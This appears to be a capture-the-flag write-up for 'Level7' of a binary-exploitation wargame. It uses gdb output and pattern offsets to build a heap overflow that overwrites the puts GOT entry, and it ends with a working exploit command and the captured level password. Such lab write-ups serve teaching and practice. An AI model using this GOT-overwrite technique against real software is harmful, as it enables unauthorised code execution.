# Level7

I dont wanna copy paste the gdb disassembly anymore, the source file in C is included anyway.

The program segfaults without parameters an prints "~~" if 2 params are given. At the same time, it opens the file containing the password of the next level, but don't do anything and close it after printing the "\~~".

There is another unused function, m, that will print the ouput of the buffer and some other insignificant data. The buffer is declared globally, and is the same one that will contain the password in the main.

In the main, the order will be :

1. The file is opened using fopen, then the content is written in the buffer using fgets (with a max read length of 68).
2. puts("~~") is called.
3. The file is closed, and some data is freed.

Since puts is a libc function, we can exploit the GOT (cf level 5) to change the address by the one of the unused m function.

Lets get the addresses we need for later use.

puts :

    (gdb) disas 0x8048400
    Dump of assembler code for function puts@plt:
        0x08048400 <+0>:	jmp    *0x8049928
        0x08048406 <+6>:	push   $0x28
        0x0804840b <+11>:	jmp    0x80483a0
    End of assembler dump.
    (gdb) x 0x8049928
    0x8049928 <puts@got.plt>:	0x08048406

m :

    (gdb) disas m
    Dump of assembler code for function m:
        0x080484f4 <+0>:	push   %ebp
        0x080484f5 <+1>:	mov    %esp,%ebp
        0x080484f7 <+3>:	sub    $0x18,%esp
        0x080484fa <+6>:	movl   $0x0,(%esp)
        0x08048501 <+13>:	call   0x80483d0 <time@plt>
        0x08048506 <+18>:	mov    $0x80486e0,%edx
        0x0804850b <+23>:	mov    %eax,0x8(%esp)
        0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)
        0x08048517 <+35>:	mov    %edx,(%esp)
        0x0804851a <+38>:	call   0x80483b0 <printf@plt>
        0x0804851f <+43>:	leave  
        0x08048520 <+44>:	ret    
    End of assembler dump.


Now, let's find the first offset with msf-pattern-create

    [...]
    (gdb) r "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
    Starting program: /home/user/level7/level7 "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"

    Program received signal SIGSEGV, Segmentation fault.
    0xb7eb8aa8 in ?? () from /lib/i386-linux-gnu/libc.so.6

    (gdb) i r
    eax            0x37614136	929120566 <-- 7aA6
    ecx            0x0	0
    edx            0x37614136	929120566 <-- 7aA6
    ebx            0xb7fd0ff4	-1208152076
    esp            0xbffff69c	0xbffff69c
    ebp            0xbffff6c8	0xbffff6c8
    esi            0x0	0
    edi            0x0	0
    eip            0xb7eb8aa8	0xb7eb8aa8
    eflags         0x210286	[ PF SF IF RF ID ]
    cs             0x73	115
    ss             0x7b	123
    ds             0x7b	123
    es             0x7b	123
    fs             0x0	0
    gs             0x33	51

    $ msf-pattern_offset -q 6Aa7
    [*] Exact match at offset 20

This time, we didn't overflow EIP but EDX, which is less useful. Let's see if we can do the same with the second argument

    (gdb) r "0123456789" "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
    Starting program: /home/user/level7/level7 "0123456789" "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"

    *** glibc detected *** /home/user/level7/level7: free(): invalid next size (normal): 0x0804a048 ***
    ======= Backtrace: =========
    /lib/i386-linux-gnu/libc.so.6(+0x74f82)[0xb7ea0f82]
    /lib/i386-linux-gnu/libc.so.6(+0x64e55)[0xb7e90e55]
    /lib/i386-linux-gnu/libc.so.6(fopen+0x2b)[0xb7e90e8b]
    /home/user/level7/level7[0x80485d8]
    /lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xb7e454d3]
    /home/user/level7/level7[0x8048461]
    ======= Memory map: ========
    08048000-08049000 r-xp 00000000 00:10 12230      /home/user/level7/level7
    08049000-0804a000 rwxp 00000000 00:10 12230      /home/user/level7/level7
    0804a000-0806b000 rwxp 00000000 00:00 0          [heap]
    b7e07000-b7e23000 r-xp 00000000 07:00 17889      /lib/i386-linux-gnu/libgcc_s.so.1
    b7e23000-b7e24000 r-xp 0001b000 07:00 17889      /lib/i386-linux-gnu/libgcc_s.so.1
    b7e24000-b7e25000 rwxp 0001c000 07:00 17889      /lib/i386-linux-gnu/libgcc_s.so.1
    b7e2b000-b7e2c000 rwxp 00000000 00:00 0 
    b7e2c000-b7fcf000 r-xp 00000000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
    b7fcf000-b7fd1000 r-xp 001a3000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
    b7fd1000-b7fd2000 rwxp 001a5000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
    b7fd2000-b7fd5000 rwxp 00000000 00:00 0 
    b7fda000-b7fdd000 rwxp 00000000 00:00 0 
    b7fdd000-b7fde000 r-xp 00000000 00:00 0          [vdso]
    b7fde000-b7ffe000 r-xp 00000000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
    b7ffe000-b7fff000 r-xp 0001f000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
    b7fff000-b8000000 rwxp 00020000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
    bffdf000-c0000000 rwxp 00000000 00:00 0          [stack]

    Program received signal SIGABRT, Aborted.
    0xb7fdd428 in __kernel_vsyscall ()

No luck this time.
But, after digging a bit about how to pass arguments to functions in x86 asm (differently from x64 - I learnt it the hard way), we found out these instructions :

   0x080485b6 <+149>:	mov    %edx,0x4(%esp)
   0x080485ba <+153>:	mov    %eax,(%esp)
   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>

Basically we move the value in the edx register to [esp + 4], which is the 1st argument used by strcpy  (dest). Here this is the second strcpy call, that means we can overflow the edx register to pass an address. So the second strcpy call would write the value of the second argument in the address used for the overflow.

Here is how the arguments in our final payload will look like :

argv[0] : 20 padding characters + address of puts (got)
argv[1] : address of m

    $ ./level7 $(python -c "print 'A'*20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
    5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
    - 1712666299
